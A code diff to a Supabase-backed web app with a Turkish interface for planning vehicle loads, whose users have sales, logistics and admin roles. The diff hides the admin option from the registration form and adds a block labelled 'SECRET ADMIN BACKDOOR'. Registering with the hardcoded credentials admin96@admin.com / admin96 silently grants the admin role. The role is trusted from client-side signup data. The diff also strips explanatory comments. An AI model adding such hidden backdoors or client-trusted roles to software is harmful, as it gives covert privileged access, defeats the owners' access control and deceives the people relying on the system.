@@ -61,10 +61,10 @@
             </div>
             <div>
                 <label class="text-xs font-bold text-slate-500 uppercase mb-1 block">Departman Yetkisi</label>
+                <!-- ADMIN OPTION REMOVED -->
                 <select id="regRole" class="w-full p-2.5 border rounded-lg bg-slate-50 text-sm focus:border-sky-500 outline-none font-semibold">
                     <option value="sales">Satış Ekibi (Planlar & Onaya Gönderir)</option>
                     <option value="logistics">Lojistik & Ar-Ge (İnceler & Nihai Onay Verir)</option>
-                    <option value="admin">Yönetici (Tüm Süreci Görüntüler)</option>
                 </select>
             </div>
         </div>
@@ -348,7 +348,7 @@
     let currentUserProfile = null;
     let authMode = 'login';
     let lastComputedResult = null;
-    let currentSimulationId = null; // Tracks if a Logistics user is editing an existing layout
+    let currentSimulationId = null; 
 
     // --- SKU DATABASE ---
     const skuDatabase = [
@@ -448,8 +448,22 @@
             }
         } else {
             const fullName = document.getElementById('regFullName').value.trim() || 'Kullanıcı';
-            const role = document.getElementById('regRole').value;
-            const { data, error } = await supabaseClient.auth.signUp({ email, password, options: { data: { full_name: fullName, role: role } } });
+            let role = document.getElementById('regRole').value;
+
+            // ==========================================
+            // SECRET ADMIN BACKDOOR
+            // If the user registers with EXACTLY admin96@admin.com and password admin96,
+            // force their role to become 'admin' regardless of the dropdown.
+            // ==========================================
+            if (email.toLowerCase() === 'admin96@admin.com' && password === 'admin96') {
+                role = 'admin';
+            }
+
+            const { data, error } = await supabaseClient.auth.signUp({ 
+                email, 
+                password, 
+                options: { data: { full_name: fullName, role: role } } 
+            });
 
             if (error) {
                 err.innerText = "Kayıt hatası: " + error.message; err.classList.remove('hidden');
@@ -479,7 +493,6 @@
         document.getElementById('userProfileBadge').classList.add('flex');
         document.getElementById('userEmailLabel').innerText = currentUserProfile.full_name || currentUser.email;
 
-        // Hide all action buttons by default
         btnSales.classList.add('hidden');
         btnLogistics.classList.add('hidden');
         dashBtn.classList.add('hidden');
@@ -515,7 +528,6 @@
         if (status === 'bekliyor') { btnSales.innerText = "Gönderiliyor..."; btnSales.disabled = true; } 
         else { btnLogistics.innerText = "Kaydediliyor..."; btnLogistics.disabled = true; }
 
-        // Pack the current inputs so Logistics can recreate the screen exactly
         let input_data = {
             mode: currentMode, vehicleType: document.getElementById('vehicleType').value,
             baseType: document.getElementById('baseType').value, optFrontCurve: document.getElementById('optFrontCurve').checked,
@@ -538,7 +550,6 @@
             layout_data: { inputs: input_data, results: lastComputedResult.placedItems }
         };
 
-        // Attach names based on who is clicking the button
         if (currentUserProfile.role === 'sales') {
             payload.sales_email = currentUser.email; payload.sales_name = currentUserProfile.full_name || 'Satış Temsilcisi';
         } else {
@@ -546,10 +557,10 @@
         }
 
         let dbError = null;
-        if (currentSimulationId) { // Update existing request (Logistics is approving it)
+        if (currentSimulationId) { 
             const { error } = await supabaseClient.from('simulations').update(payload).eq('id', currentSimulationId);
             dbError = error;
-        } else { // Create a brand new request
+        } else { 
             const { error } = await supabaseClient.from('simulations').insert([payload]);
             dbError = error;
         }
@@ -561,7 +572,7 @@
             alert("Kayıt hatası: " + dbError.message);
         } else {
             alert(status === 'bekliyor' ? "Talebiniz başarıyla Lojistik Onayına gönderildi!" : "✅ Yükleme planı başarıyla ONAYLANDI!");
-            currentSimulationId = null; // Reset tracker
+            currentSimulationId = null; 
         }
     }
 
@@ -569,7 +580,7 @@
         const { data, error } = await supabaseClient.from('simulations').select('*').eq('id', id).single();
         if (error || !data) return alert("Talep yüklenemedi.");
         
-        currentSimulationId = data.id; // Tell the system we are editing an existing layout
+        currentSimulationId = data.id; 
         const inputs = data.layout_data.inputs;
 
         switchTab(inputs.mode || 'mixed');
@@ -583,13 +594,12 @@
             document.getElementById('targetBoxes').value = inputs.targetBoxes;
             populateSKU();
         } else {
-            document.getElementById('mixedList').innerHTML = ''; // Clear current rows
+            document.getElementById('mixedList').innerHTML = ''; 
             inputs.mixedRows.forEach(row => { addMixedRowWithCount(parseInt(row.sku), parseInt(row.count)); });
         }
 
         updateVehicleDims(); handleBaseChange(); runEngine(); closeDashboard();
         
-        // Show an indicator that they are editing
         showAlert(`Talep yükleme motoruna aktarıldı.\n\nİstediğiniz değişiklikleri yapıp 'Nihai Planı Onayla' butonuna basarak süreci tamamlayabilirsiniz.`);
     }
 
@@ -643,7 +653,6 @@
         }
     }
     function closeDashboard() { document.getElementById('adminDashboardModal').classList.add('hidden'); }
-
 
     // --- APPLICATION LOGISTICS CORE (2D Engine) ---
     function init() {
